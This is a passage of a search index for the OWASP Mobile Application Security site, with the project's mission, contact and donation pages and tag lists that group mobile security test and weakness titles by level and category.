{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"OWASP Mobile Application Security","text":"","tags":[]},{"location":"#our-mission","title":"Our MissionOWASP MASVSOWASP MASWEOWASP MASTGOWASP MAS Checklist","text":"\"Define the industry standard for mobile application security.\" <p>The OWASP Mobile Application Security (MAS) flagship project provides a security standard for mobile apps (OWASP MASVS), a list of common security and privacy weaknesses specific to mobile apps (OWASP MASWE) and a comprehensive testing guide (OWASP MASTG) that covers the processes, techniques, and tools and test cases that enable testers to deliver consistent and complete results.</p> <p></p>","tags":[]},{"location":"#trusted-by","title":"Trusted By","text":"<p>The OWASP MASVS and MASTG are trusted by the following platform providers and standardization, governmental and educational institutions. Learn more.</p> <p> </p> <p></p>","tags":[]},{"location":"#mas-advocates","title":"\ud83e\udd47 MAS Advocates","text":"<p>MAS Advocates are key industry adopters of the OWASP MASVS and MASTG who have invested a significant and consistent amount of resources to drive the project forward and ensure its continued success. This includes making consistent high-impact contributions and actively promoting the adoption and usage of the project. Learn more.</p> <p></p>","tags":[]},{"location":"contact/","title":"\ud83d\udcac Connect with Us","text":"<p>You can follow and reach out to the OWASP MAS team in many ways.</p> <ul> <li>Send us your questions and ideas to GitHub Discussions</li> <li>Stay always up-to-date by following us on Twitter.</li> <li>Join our Slack community</li> </ul> <p>If you'd like to contribute, take a look at our Contributions page or reach out to the project leaders Carlos or Sven.</p> <p> </p> <p>Request an invitation to join our Slack channel <code>#project-mobile-app-security</code></p> <p></p>","tags":[]},{"location":"contact/#owasp-mas-project-leaders","title":"OWASP MAS Project Leaders","text":"","tags":[]},{"location":"contact/#carlos-holguera","title":"Carlos Holguera","text":"<p>Carlos is a mobile security research engineer who has gained many years of hands-on experience in the field of security testing for mobile apps and embedded systems such as automotive control units and IoT devices. He is passionate about reverse engineering and dynamic instrumentation of mobile apps and is continuously learning and sharing his knowledge.</p> <p> </p> <p></p>","tags":[]},{"location":"contact/#sven-schleier","title":"Sven Schleier","text":"<p>Sven is an experienced web and mobile penetration tester and assessed everything from historic Flash applications to progressive mobile apps. He is also a security engineer that supported many projects end-to-end during the SDLC to \"build security in\". He was speaking at local and international meetups and conferences and is conducting hands-on workshops about web application and mobile app security.</p> <p> </p> <p></p>","tags":[]},{"location":"donate/","title":"Donations","text":"<p>We thank our donators for providing the funds to support us on our project activities.</p> <p>The OWASP Foundation is very grateful for the support by the individuals and organizations listed. However please note, the OWASP Foundation is strictly vendor neutral and does not endorse any of its supporters. Donations do not influence the content of the MASVS or MASTG in any way.</p> <p> </p> <p>While both the MASVS and the MASTG are created and maintained by the community on a voluntary basis, sometimes a little bit of outside help is required.</p> <p>Monetary Donations: You can donate any amount you like, no matter how small, anyone can help. From 500$ up you may select a Donation Package and be listed as a donator.</p> <p>100% of the funds go to the OWASP Foundation and allow us funding our project activities such as contracting technical editors, graphic designers, software developers, purchasing test devices, creating swag, etc.</p> <p> Donate</p> <p>Effort Based: You can instead support the project by contributing with your work and end up at our acknowledgement section.</p> <p>If you're a company, consider becoming a \"MAS Advocate\" which is the highest status that companies can achieve in the project acknowledging that they've gone above and beyond to support the project.</p> <p> Contribute  Become a MAS Advocate</p>","tags":[]},{"location":"tags/","title":"Tags","text":"","tags":[]},{"location":"tags/#tag:l1","title":"L1","text":"<ul> <li>            MASTG-TEST-0001: Testing Local Storage for Sensitive Data          </li> <li>            MASTG-TEST-0002: Testing Local Storage for Input Validation          </li> <li>            MASTG-TEST-0003: Testing Logs for Sensitive Data          </li> <li>            MASTG-TEST-0004: Determining Whether Sensitive Data Is Shared with Third Parties via Embedded Services          </li> <li>            MASTG-TEST-0005: Determining Whether Sensitive Data Is Shared with Third Parties via Notifications          </li> <li>            MASTG-TEST-0006: Determining Whether the Keyboard Cache Is Disabled for Text Input Fields          </li> <li>            MASTG-TEST-0007: Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms          </li> <li>            MASTG-TEST-0009: Testing Backups for Sensitive Data          </li> <li>            MASTG-TEST-0013: Testing Symmetric Cryptography          </li> <li>            MASTG-TEST-0014: Testing the Configuration of Cryptographic Standard Algorithms          </li> <li>            MASTG-TEST-0016: Testing Random Number Generation          </li> <li>            MASTG-TEST-0019: Testing Data Encryption on the Network          </li> <li>            MASTG-TEST-0020: Testing the TLS Settings          </li> <li>            MASTG-TEST-0021: Testing Endpoint Identify Verification          </li> <li>            MASTG-TEST-0024: Testing for App Permissions          </li> <li>            MASTG-TEST-0025: Testing for Injection Flaws          </li> <li>            MASTG-TEST-0026: Testing Implicit Intents          </li> <li>            MASTG-TEST-0027: Testing for URL Loading in WebViews          </li> <li>            MASTG-TEST-0028: Testing Deep Links          </li> <li>            MASTG-TEST-0029: Testing for Sensitive Functionality Exposure Through IPC          </li> <li>            MASTG-TEST-0030: Testing for Vulnerable Implementation of PendingIntent          </li> <li>            MASTG-TEST-0031: Testing JavaScript Execution in WebViews          </li> <li>            MASTG-TEST-0032: Testing WebView Protocol Handlers          </li> <li>            MASTG-TEST-0033: Testing for Java Objects Exposed Through WebViews          </li> <li>            MASTG-TEST-0034: Testing Object Persistence          </li> <li>            MASTG-TEST-0042: Checking for Weaknesses in Third Party Libraries          </li> <li>            MASTG-TEST-0043: Memory Corruption Bugs          </li> <li>            MASTG-TEST-0044: Make Sure That Free Security Features Are Activated          </li> <li>            MASTG-TEST-0052: Testing Local Data Storage          </li> <li>            MASTG-TEST-0053: Checking Logs for Sensitive Data          </li> <li>            MASTG-TEST-0054: Determining Whether Sensitive Data Is Shared with Third Parties          </li> <li>            MASTG-TEST-0055: Finding Sensitive Data in the Keyboard Cache          </li> <li>            MASTG-TEST-0056: Determining Whether Sensitive Data Is Exposed via IPC Mechanisms          </li> <li>            MASTG-TEST-0058: Testing Backups for Sensitive Data          </li> <li>            MASTG-TEST-0061: Verifying the Configuration of Cryptographic Standard Algorithms          </li> <li>            MASTG-TEST-0063: Testing Random Number Generation          </li> <li>            MASTG-TEST-0065: Testing Data Encryption on the Network          </li> <li>            MASTG-TEST-0066: Testing the TLS Settings          </li> <li>            MASTG-TEST-0067: Testing Endpoint Identity Verification          </li> <li>            MASTG-TEST-0069: Testing App Permissions          </li> <li>            MASTG-TEST-0070: Testing Universal Links          </li> <li>            MASTG-TEST-0071: Testing UIActivity Sharing          </li> <li>            MASTG-TEST-0072: Testing App Extensions          </li> <li>            MASTG-TEST-0073: Testing UIPasteboard          </li> <li>            MASTG-TEST-0075: Testing Custom URL Schemes          </li> <li>            MASTG-TEST-0076: Testing iOS WebViews          </li> <li>            MASTG-TEST-0077: Testing WebView Protocol Handlers          </li> <li>            MASTG-TEST-0078: Determining Whether Native Methods Are Exposed Through WebViews          </li> <li>            MASTG-TEST-0079: Testing Object Persistence          </li> <li>            MASTG-TEST-0085: Checking for Weaknesses in Third Party Libraries          </li> <li>            MASTG-TEST-0086: Memory Corruption Bugs          </li> <li>            MASTG-TEST-0087: Make Sure That Free Security Features Are Activated          </li> <li>            MASTG-TEST-0200: Files Written to External Storage          </li> <li>            MASTG-TEST-0201: Runtime Use of APIs to Access External Storage          </li> <li>            MASTG-TEST-0202: References to APIs and Permissions for Accessing External Storage          </li> <li>            MASTG-TEST-0203: Runtime Use of Logging APIs          </li> <li>            MASTG-TEST-0204: Insecure Random API Usage          </li> <li>            MASTG-TEST-0205: Non-random Sources Usage          </li> <li>            MASTG-TEST-0208: Insufficient Key Sizes          </li> <li>            MASTG-TEST-0209: Insufficient Key Sizes          </li> <li>            MASTG-TEST-0210: Broken Symmetric Encryption Algorithms          </li> <li>            MASTG-TEST-0211: Broken Hashing Algorithms          </li> <li>            MASTG-TEST-0212: Use of Hardcoded Cryptographic Keys in Code          </li> <li>            MASTG-TEST-0213: Use of Hardcoded Cryptographic Keys in Code          </li> <li>            MASTG-TEST-0214: Hardcoded Cryptographic Keys in Files          </li> <li>            MASTG-TEST-0215: Sensitive Data Not Excluded From Backup          </li> <li>            MASTG-TEST-0216: Sensitive Data Not Excluded From Backup          </li> <li>            MASTG-TEST-0217: Insecure TLS Protocols Explicitly Allowed in Code          </li> <li>            MASTG-TEST-0218: Insecure TLS Protocols in Network Traffic          </li> <li>            MASTG-TEST-0221: Broken Symmetric Encryption Algorithms          </li> <li>            MASTG-TEST-0231: References to Logging APIs          </li> <li>            MASTG-TEST-0232: Broken Symmetric Encryption Modes          </li> <li>            MASTG-TEST-0233: Hardcoded HTTP URLs          </li> <li>            MASTG-TEST-0234: Missing Implementation of Server Hostname Verification with SSLSockets          </li> <li>            MASTG-TEST-0235: Android App Configurations Allowing Cleartext Traffic          </li> <li>            MASTG-TEST-0236: Cleartext Traffic Observed on the Network          </li> <li>            MASTG-TEST-0237: Cross-Platform Framework Configurations Allowing Cleartext Traffic          </li> <li>            MASTG-TEST-0238: Runtime Use of Network APIs Transmitting Cleartext Traffic          </li> <li>            MASTG-TEST-0239: Using low-level APIs (e.g. Socket) to set up a custom HTTP connection          </li> <li>            MASTG-TEST-0250: References to Content Provider Access in WebViews          </li> <li>            MASTG-TEST-0251: Runtime Use of Content Provider Access APIs in WebViews          </li> <li>            MASTG-TEST-0252: References to Local File Access in WebViews          </li> <li>            MASTG-TEST-0253: Runtime Use of Local File Access APIs in WebViews          </li> <li>            MASTG-TEST-0262: References to Backup Configurations Not Excluding Sensitive Data          </li> <li>            MASTG-TEST-0272: Identify Dependencies with Known Vulnerabilities in the Android Project          </li> <li>            MASTG-TEST-0273: Identify Dependencies with Known Vulnerabilities by Scanning Dependency Managers Artifacts          </li> <li>            MASTG-TEST-0274: Dependencies with Known Vulnerabilities in the App's SBOM          </li> <li>            MASTG-TEST-0275: Dependencies with Known Vulnerabilities in the App's SBOM          </li> <li>            MASTG-TEST-0282: Unsafe Custom Trust Evaluation          </li> <li>            MASTG-TEST-0283: Incorrect Implementation of Server Hostname Verification          </li> <li>            MASTG-TEST-0284: Incorrect SSL Error Handling in WebViews          </li> <li>            MASTG-TEST-0285: Outdated Android Version Allowing Trust in User-Provided CAs          </li> <li>            MASTG-TEST-0286: Network Security Configuration Allowing Trust in User-Provided CAs          </li> <li>            MASTG-TEST-0287: Sensitive Data Stored Unencrypted via the SharedPreferences API to the App Sandbox          </li> <li>            MASWE-0001: Insertion of Sensitive Data into Logs          </li> <li>            MASWE-0002: Sensitive Data Stored With Insufficient Access Restrictions in Internal Locations          </li> <li>            MASWE-0004: Sensitive Data Not Excluded From Backup          </li> <li>            MASWE-0005: API Keys Hardcoded in the App Package          </li> <li>            MASWE-0007: Sensitive Data Stored Unencrypted in Shared Storage Requiring No User Interaction          </li> <li>            MASWE-0009: Improper Cryptographic Key Generation          </li> <li>            MASWE-0010: Improper Cryptographic Key Derivation          </li> <li>            MASWE-0014: Cryptographic Keys Not Properly Protected at Rest          </li> <li>            MASWE-0020: Improper Encryption          </li> <li>            MASWE-0021: Improper Hashing          </li> <li>            MASWE-0022: Predictable Initialization Vectors (IVs)          </li> <li>            MASWE-0023: Risky Padding          </li> <li>            MASWE-0024: Improper Use of Message Authentication Code (MAC)          </li> <li>            MASWE-0025: Improper Generation of Cryptographic Signatures          </li> <li>            MASWE-0026: Improper Verification of Cryptographic Signature          </li> <li>            MASWE-0027: Improper Random Number Generation          </li> <li>            MASWE-0036: Authentication Material Stored Unencrypted on the Device          </li> <li>            MASWE-0037: Authentication Material Sent over Insecure Connections          </li> <li>            MASWE-0038: Authentication Tokens Not Validated          </li> <li>            MASWE-0040: Insecure Authentication in WebViews          </li> <li>            MASWE-0041: Authentication Enforced Only Locally Instead of on the Server-side          </li> <li>            MASWE-0042: Authorization Enforced Only Locally Instead of on the Server-side          </li> <li>            MASWE-0048: Insecure Machine-to-Machine Communication          </li> <li>            MASWE-0050: Cleartext Traffic          </li> <li>            MASWE-0052: Insecure Certificate Validation          </li> <li>            MASWE-0057: StrandHogg Attack / Task Affinity Vulnerability          </li> <li>            MASWE-0058: Insecure Deep Links          </li> <li>            MASWE-0059: Use Of Unauthenticated Platform IPC          </li> <li>            MASWE-0060: Insecure Use of UIActivity          </li> <li>            MASWE-0061: Insecure Use of App Extensions          </li> <li>            MASWE-0062: Insecure Services          </li> <li>            MASWE-0063: Insecure Broadcast Receivers          </li> <li>            MASWE-0064: Insecure Content Providers          </li> <li>            MASWE-0065: Sensitive Data Permanently Shared with Other Apps          </li> <li>            MASWE-0066: Insecure Intents          </li> <li>            MASWE-0068: JavaScript Bridges in WebViews          </li> <li>            MASWE-0069: WebViews Allows Access to Local Resources          </li> <li>            MASWE-0070: JavaScript Loaded from Untrusted Sources          </li> <li>            MASWE-0071: WebViews Loading Content from Untrusted Sources          </li> <li>            MASWE-0072: Universal XSS          </li> <li>            MASWE-0076: Dependencies with Known Vulnerabilities          </li> <li>            MASWE-0079: Unsafe Handling of Data from the Network          </li> <li>            MASWE-0080: Unsafe Handling of Data from Backups          </li> <li>            MASWE-0081: Unsafe Handling Of Data From External Interfaces          </li> <li>            MASWE-0082: Unsafe Handling of Data From Local Storage          </li> <li>            MASWE-0083: Unsafe Handling of Data From The User Interface          </li> <li>            MASWE-0084: Unsafe Handling of Data from IPC          </li> <li>            MASWE-0086: SQL Injection          </li> </ul>","tags":[]},{"location":"tags/#tag:l2","title":"L2","text":"<ul> <li>            MASTG-TEST-0001: Testing Local Storage for Sensitive Data          </li> <li>            MASTG-TEST-0002: Testing Local Storage for Input Validation          </li> <li>            MASTG-TEST-0003: Testing Logs for Sensitive Data          </li> <li>            MASTG-TEST-0004: Determining Whether Sensitive Data Is Shared with Third Parties via Embedded Services          </li> <li>            MASTG-TEST-0005: Determining Whether Sensitive Data Is Shared with Third Parties via Notifications          </li> <li>            MASTG-TEST-0006: Determining Whether the Keyboard Cache Is Disabled for Text Input Fields          </li> <li>            MASTG-TEST-0007: Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms          </li> <li>            MASTG-TEST-0008: Checking for Sensitive Data Disclosure Through the User Interface          </li> <li>            MASTG-TEST-0009: Testing Backups for Sensitive Data          </li> <li>            MASTG-TEST-0010: Finding Sensitive Information in Auto-Generated Screenshots          </li> <li>            MASTG-TEST-0011: Testing Memory for Sensitive Data          </li> <li>            MASTG-TEST-0012: Testing the Device-Access-Security Policy          </li> <li>            MASTG-TEST-0013: Testing Symmetric Cryptography          </li> <li>            MASTG-TEST-0014: Testing the Configuration of Cryptographic Standard Algorithms          </li> <li>            MASTG-TEST-0015: Testing the Purposes of Keys          </li> <li>            MASTG-TEST-0016: Testing Random Number Generation          </li> <li>            MASTG-TEST-0017: Testing Confirm Credentials          </li> <li>            MASTG-TEST-0018: Testing Biometric Authentication          </li> <li>            MASTG-TEST-0019: Testing Data Encryption on the Network          </li> <li>            MASTG-TEST-0020: Testing the TLS Settings          </li> <li>            MASTG-TEST-0021: Testing Endpoint Identify Verification          </li> <li>            MASTG-TEST-0022: Testing Custom Certificate Stores and Certificate Pinning          </li> <li>            MASTG-TEST-0023: Testing the Security Provider          </li> <li>            MASTG-TEST-0024: Testing for App Permissions          </li> <li>            MASTG-TEST-0025: Testing for Injection Flaws          </li> <li>            MASTG-TEST-0026: Testing Implicit Intents          </li> <li>            MASTG-TEST-0027: Testing for URL Loading in WebViews          </li> <li>            MASTG-TEST-0028: Testing Deep Links          </li> <li>            MASTG-TEST-0029: Testing for Sensitive Functionality Exposure Through IPC          </li> <li>            MASTG-TEST-0030: Testing for Vulnerable Implementation of PendingIntent          </li> <li>            MASTG-TEST-0031: Testing JavaScript Execution in WebViews          </li> <li>            MASTG-TEST-0032: Testing WebView Protocol Handlers          </li> <li>            MASTG-TEST-0033: Testing for Java Objects Exposed Through WebViews          </li> <li>            MASTG-TEST-0034: Testing Object Persistence          </li> <li>            MASTG-TEST-0035: Testing for Overlay Attacks          </li> <li>            MASTG-TEST-0036: Testing Enforced Updating          </li> <li>            MASTG-TEST-0037: Testing WebViews Cleanup          </li> <li>            MASTG-TEST-0042: Checking for Weaknesses in Third Party Libraries          </li> <li>            MASTG-TEST-0043: Memory Corruption Bugs          </li> <li>            MASTG-TEST-0044: Make Sure That Free Security Features Are Activated          </li> <li>            MASTG-TEST-0052: Testing Local Data Storage          </li> <li>            MASTG-TEST-0053: Checking Logs for Sensitive Data          </li> <li>            MASTG-TEST-0054: Determining Whether Sensitive Data Is Shared with Third Parties          </li> <li>            MASTG-TEST-0055: Finding Sensitive Data in the Keyboard Cache          </li> <li>            MASTG-TEST-0056: Determining Whether Sensitive Data Is Exposed via IPC Mechanisms          </li> <li>            MASTG-TEST-0057: Checking for Sensitive Data Disclosed Through the User Interface          </li> <li>            MASTG-TEST-0058: Testing Backups for Sensitive Data          </li> <li>            MASTG-TEST-0059: Testing Auto-Generated Screenshots for Sensitive Information          </li> <li>            MASTG-TEST-0060: Testing Memory for Sensitive Data          </li> <li>            MASTG-TEST-0061: Verifying the Configuration of Cryptographic Standard Algorithms          </li> <li>            MASTG-TEST-0062: Testing Key Management          </li> <li>            MASTG-TEST-0063: Testing Random Number Generation          </li> <li>            MASTG-TEST-0064: Testing Biometric Authentication          </li> <li>            MASTG-TEST-0065: Testing Data Encryption on the Network          </li> <li>            MASTG-TEST-0066: Testing the TLS Settings          </li> <li>            MASTG-TEST-0067: Testing Endpoint Identity Verification          </li> <li>            MASTG-TEST-0068: Testing Custom Certificate Stores and Certificate Pinning          </li> <li>            MASTG-TEST-0069: Testing App Permissions          </li> <li>            MASTG-TEST-0070: Testing Universal Links          </li> <li>            MASTG-TEST-0071: Testing UIActivity Sharing          </li> <li>            MASTG-TEST-0072: Testing App Extensions          </li> <li>            MASTG-TEST-0073: Testing UIPasteboard          </li> <li>            MASTG-TEST-0075: Testing Custom URL Schemes          </li> <li>            MASTG-TEST-0076: Testing iOS WebViews          </li> <li>            MASTG-TEST-0077: Testing WebView Protocol Handlers          </li> <li>            MASTG-TEST-0078: Determining Whether Native Methods Are Exposed Through WebViews          </li> <li>            MASTG-TEST-0079: Testing Object Persistence          </li> <li>            MASTG-TEST-0080: Testing Enforced Updating          </li> <li>            MASTG-TEST-0085: Checking for Weaknesses in Third Party Libraries          </li> <li>            MASTG-TEST-0086: Memory Corruption Bugs          </li> <li>            MASTG-TEST-0087: Make Sure That Free Security Features Are Activated          </li> <li>            MASTG-TEST-0200: Files Written to External Storage          </li> <li>            MASTG-TEST-0201: Runtime Use of APIs to Access External Storage          </li> <li>            MASTG-TEST-0202: References to APIs and Permissions for Accessing External Storage          </li> <li>            MASTG-TEST-0203: Runtime Use of Logging APIs          </li> <li>            MASTG-TEST-0204: Insecure Random API Usage          </li> <li>            MASTG-TEST-0205: Non-random Sources Usage          </li> <li>            MASTG-TEST-0207: Data Stored in the App Sandbox at Runtime          </li> <li>            MASTG-TEST-0208: Insufficient Key Sizes          </li> <li>            MASTG-TEST-0209: Insufficient Key Sizes          </li> <li>            MASTG-TEST-0210: Broken Symmetric Encryption Algorithms          </li> <li>            MASTG-TEST-0211: Broken Hashing Algorithms          </li> <li>            MASTG-TEST-0212: Use of Hardcoded Cryptographic Keys in Code          </li> <li>            MASTG-TEST-0213: Use of Hardcoded Cryptographic Keys in Code          </li> <li>            MASTG-TEST-0214: Hardcoded Cryptographic Keys in Files          </li> <li>            MASTG-TEST-0215: Sensitive Data Not Excluded From Backup          </li> <li>            MASTG-TEST-0216: Sensitive Data Not Excluded From Backup          </li> <li>            MASTG-TEST-0217: Insecure TLS Protocols Explicitly Allowed in Code          </li> <li>            MASTG-TEST-0218: Insecure TLS Protocols in Network Traffic          </li> <li>            MASTG-TEST-0221: Broken Symmetric Encryption Algorithms          </li> <li>            MASTG-TEST-0222: Position Independent Code (PIC) Not Enabled          </li> <li>            MASTG-TEST-0223: Stack Canaries Not Enabled          </li> <li>            MASTG-TEST-0228: Position Independent Code (PIC) not Enabled          </li> <li>            MASTG-TEST-0229: Stack Canaries Not enabled          </li> <li>            MASTG-TEST-0230: Automatic Reference Counting (ARC) not enabled          </li> <li>            MASTG-TEST-0231: References to Logging APIs          </li> <li>            MASTG-TEST-0232: Broken Symmetric Encryption Modes          </li> <li>            MASTG-TEST-0233: Hardcoded HTTP URLs          </li> <li>            MASTG-TEST-0234: Missing Implementation of Server Hostname Verification with SSLSockets          </li> <li>            MASTG-TEST-0235: Android App Configurations Allowing Cleartext Traffic          </li> <li>            MASTG-TEST-0236: Cleartext Traffic Observed on the Network          </li> <li>            MASTG-TEST-0237: Cross-Platform Framework Configurations Allowing Cleartext Traffic          </li> <li>            MASTG-TEST-0238: Runtime Use of Network APIs Transmitting Cleartext Traffic          </li> <li>            MASTG-TEST-0239: Using low-level APIs (e.g. Socket) to set up a custom HTTP connection          </li> <li>            MASTG-TEST-0242: Missing Certificate Pinning in Network Security Configuration          </li> <li>            MASTG-TEST-0243: Expired Certificate Pins in the Network Security Configuration          </li> <li>            MASTG-TEST-0244: Missing Certificate Pinning in Network Traffic          </li> <li>            MASTG-TEST-0245: References to Platform Version APIs          </li> <li>            MASTG-TEST-0246: Runtime Use of Secure Screen Lock Detection APIs          </li> <li>            MASTG-TEST-0247: References to APIs for Detecting Secure Screen Lock          </li> <li>            MASTG-TEST-0248: References to APIs for Detecting Secure Screen Lock          </li> <li>            MASTG-TEST-0249: Runtime Use of Secure Screen Lock Detection APIs          </li> <li>            MASTG-TEST-0250: References to Content Provider Access in WebViews          </li> <li>            MASTG-TEST-0251: Runtime Use of Content Provider Access APIs in WebViews          </li> <li>            MASTG-TEST-0252: References to Local File Access in WebViews          </li> <li>            MASTG-TEST-0253: Runtime Use of Local File Access APIs in WebViews          </li> <li>            MASTG-TEST-0258: References to Keyboard Caching Attributes in UI Elements          </li> <li>            MASTG-TEST-0262: References to Backup Configurations Not Excluding Sensitive Data          </li> <li>            MASTG-TEST-0266: References to APIs for Event-Bound Biometric Authentication          </li> <li>            MASTG-TEST-0267: Runtime Use Of Event-Bound Biometric Authentication          </li> <li>            MASTG-TEST-0268: References to APIs Allowing Fallback to Non-Biometric Authentication          </li> <li>            MASTG-TEST-0269: Runtime Use Of APIs Allowing Fallback to Non-Biometric Authentication          </li> <li>            MASTG-TEST-0270: References to APIs Detecting Biometric Enrollment Changes          </li> <li>            MASTG-TEST-0271: Runtime Use Of APIs Detecting Biometric Enrollment Changes          </li> <li>            MASTG-TEST-0272: Identify Dependencies with Known Vulnerabilities in the Android Project          </li> <li>            MASTG-TEST-0273: Identify Dependencies with Known Vulnerabilities by Scanning Dependency Managers Artifacts          </li> <li>            MASTG-TEST-0274: Dependencies with Known Vulnerabilities in the App's SBOM          </li> <li>            MASTG-TEST-0275: Dependencies with Known Vulnerabilities in the App's SBOM          </li> <li>            MASTG-TEST-0276: Use of the iOS General Pasteboard          </li> <li>            MASTG-TEST-0277: Sensitive Data in the iOS General Pasteboard at Runtime          </li> <li>            MASTG-TEST-0278: Pasteboard Contents Not Cleared After Use          </li> <li>            MASTG-TEST-0279: Pasteboard Contents Not Expiring          </li> <li>            MASTG-TEST-0280: Pasteboard Contents Not Restricted to Local Device          </li> <li>            MASTG-TEST-0282: Unsafe Custom Trust Evaluation          </li> <li>            MASTG-TEST-0283: Incorrect Implementation of Server Hostname Verification          </li> <li>            MASTG-TEST-0284: Incorrect SSL Error Handling in WebViews          </li> <li>            MASTG-TEST-0285: Outdated Android Version Allowing Trust in User-Provided CAs          </li> <li>            MASTG-TEST-0286: Network Security Configuration Allowing Trust in User-Provided CAs          </li> <li>            MASTG-TEST-0287: Sensitive Data Stored Unencrypted via the SharedPreferences API to the App Sandbox          </li> <li>            MASWE-0001: Insertion of Sensitive Data into Logs          </li> <li>            MASWE-0002: Sensitive Data Stored With Insufficient Access Restrictions in Internal Locations          </li> <li>            MASWE-0003: Backup Unencrypted          </li> <li>            MASWE-0004: Sensitive Data Not Excluded From Backup          </li> <li>            MASWE-0005: API Keys Hardcoded in the App Package          </li> <li>            MASWE-0006: Sensitive Data Stored Unencrypted in Private Storage Locations          </li> <li>            MASWE-0007: Sensitive Data Stored Unencrypted in Shared Storage Requiring No User Interaction          </li> <li>            MASWE-0008: Missing Device Secure Lock Verification Implementation          </li> <li>            MASWE-0009: Improper Cryptographic Key Generation          </li> <li>            MASWE-0010: Improper Cryptographic Key Derivation          </li> <li>            MASWE-0011: Cryptographic Key Rotation Not Implemented          </li> <li>            MASWE-0012: Insecure or Wrong Usage of Cryptographic Key          </li> <li>            MASWE-0014: Cryptographic Keys Not Properly Protected at Rest          </li> <li>            MASWE-0015: Deprecated Android KeyStore Implementations          </li> <li>            MASWE-0016: Unsafe Handling of Imported Cryptographic Keys          </li> <li>            MASWE-0017: Cryptographic Keys Not Properly Protected on Export          </li> <li>            MASWE-0018: Cryptographic Keys Access Not Restricted          </li> <li>            MASWE-0019: Risky Cryptography Implementations          </li> <li>            MASWE-0020: Improper Encryption          </li> <li>            MASWE-0021: Improper Hashing          </li> <li>            MASWE-0022: Predictable Initialization Vectors (IVs)          </li> <li>            MASWE-0023: Risky Padding          </li> <li>            MASWE-0024: Improper Use of Message Authentication Code (MAC)          </li> <li>            MASWE-0025: Improper Generation of Cryptographic Signatures          </li> <li>            MASWE-0026: Improper Verification of Cryptographic Signature          </li> <li>            MASWE-0027: Improper Random Number Generation          </li> <li>            MASWE-0028: MFA Implementation Best Practices Not Followed          </li> <li>            MASWE-0029: Step-Up Authentication Not Implemented After Login          </li> <li>            MASWE-0030: Re-Authenticates Not Triggered On Contextual State Changes          </li> <li>            MASWE-0031: Insecure use of Android Protected Confirmation          </li> <li>            MASWE-0032: Platform-provided Authentication APIs Not Used          </li> <li>            MASWE-0033: Authentication or Authorization Protocol Security Best Practices Not Followed          </li> <li>            MASWE-0034: Insecure Implementation of Confirm Credentials          </li> <li>            MASWE-0035: Passwordless Authentication Not Implemented          </li> <li>            MASWE-0036: Authentication Material Stored Unencrypted on the Device          </li> <li>            MASWE-0037: Authentication Material Sent over Insecure Connections          </li> <li>            MASWE-0038: Authentication Tokens Not Validated          </li> <li>            MASWE-0039: Shared Web Credentials and Website-association Not Implemented          </li> <li>            MASWE-0040: Insecure Authentication in WebViews          </li> <li>            MASWE-0041: Authentication Enforced Only Locally Instead of on the Server-side          </li> <li>            MASWE-0042: Authorization Enforced Only Locally Instead of on the Server-side          </li> <li>            MASWE-0043: App Custom PIN Not Bound to Platform KeyStore          </li> <li>            MASWE-0044: Biometric Authentication Can Be Bypassed          </li> <li>            MASWE-0045: Fallback to Non-biometric Credentials Allowed for Sensitive Transactions          </li> <li>            MASWE-0046: Crypto Keys Not Invalidated on New Biometric Enrollment          </li> <li>            MASWE-0047: Insecure Identity Pinning          </li> <li>            MASWE-0048: Insecure Machine-to-Machine Communication          </li> <li>            MASWE-0049: Proven Networking APIs Not used          </li> <li>            MASWE-0050: Cleartext Traffic          </li> <li>            MASWE-0051: Unprotected Open Ports          </li> <li>            MASWE-0052: Insecure Certificate Validation          </li> <li>            MASWE-0053: Sensitive Data Leaked via the User Interface          </li> <li>            MASWE-0054: Sensitive Data Leaked via Notifications          </li> <li>            MASWE-0055: Sensitive Data Leaked via Screenshots          </li> <li>            MASWE-0056: Tapjacking Attacks          </li> <li>            MASWE-0057: StrandHogg Attack / Task Affinity Vulnerability          </li> <li>            MASWE-0058: Insecure Deep Links          </li> <li>            MASWE-0059: Use Of Unauthenticated Platform IPC          </li> <li>            MASWE-0060: Insecure Use of UIActivity          </li> <li>            MASWE-0061: Insecure Use of App Extensions          </li> <li>            MASWE-0062: Insecure Services          </li> <li>            MASWE-0063: Insecure Broadcast Receivers          </li> <li>            MASWE-0064: Insecure Content Providers          </li> <li>            MASWE-0065: Sensitive Data Permanently Shared with Other Apps          </li> <li>            MASWE-0066: Insecure Intents          </li> <li>            MASWE-0068: JavaScript Bridges in WebViews          </li> <li>            MASWE-0069: WebViews Allows Access to Local Resources          </li> <li>            MASWE-0070: JavaScript Loaded from Untrusted Sources          </li> <li>            MASWE-0071: WebViews Loading Content from Untrusted Sources          </li> <li>            MASWE-0072: Universal XSS          </li> <li>            MASWE-0073: Insecure WebResourceResponse Implementations          </li> <li>            MASWE-0074: Web Content Debugging Enabled          </li> <li>            MASWE-0075: Enforced Updating Not Implemented          </li> <li>            MASWE-0076: Dependencies with Known Vulnerabilities          </li> <li>            MASWE-0077: Running on a recent Platform Version Not Ensured          </li> <li>            MASWE-0078: Latest Platform Version Not Targeted          </li> <li>            MASWE-0079: Unsafe Handling of Data from the Network          </li> <li>            MASWE-0080: Unsafe Handling of Data from Backups          </li> <li>            MASWE-0081: Unsafe Handling Of Data From External Interfaces          </li> <li>            MASWE-0082: Unsafe Handling of Data From Local Storage          </li> <li>            MASWE-0083: Unsafe Handling of Data From The User Interface          </li> <li>            MASWE-0084: Unsafe Handling of Data from IPC          </li> <li>            MASWE-0085: Unsafe Dynamic Code Loading          </li> <li>            MASWE-0086: SQL Injection          </li> <li>            MASWE-0087: Insecure Parsing and Escaping          </li> <li>            MASWE-0088: Insecure Object Deserialization          </li> <li>            MASWE-0116: Compiler Provided Security Features Not Used          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-auth","title":"MASVS-AUTH","text":"<ul> <li>            Android Local Authentication          </li> <li>            MASTG-KNOW-0001: Biometric Authentication          </li> <li>            MASTG-KNOW-0002: FingerprintManager          </li> <li>            MASTG-KNOW-0056: Local Authentication Framework          </li> <li>            MASTG-KNOW-0057: Keychain Services          </li> <li>            Mobile App Authentication Architectures          </li> <li>            iOS Local Authentication          </li> </ul>","tags":[]},{"location":"tags/#tag:masvs-code","title":"MASVS-CODE","text":"<ul> <li>            Android Code Quality and Build Settings          </li> <li>            MASTG-KNOW-0003: App Signing          </li> <li>            MASTG-KNOW-0004: Third-Party Libraries          </li> <li>            MASTG-KNOW-0005: Memory Corruption Bugs          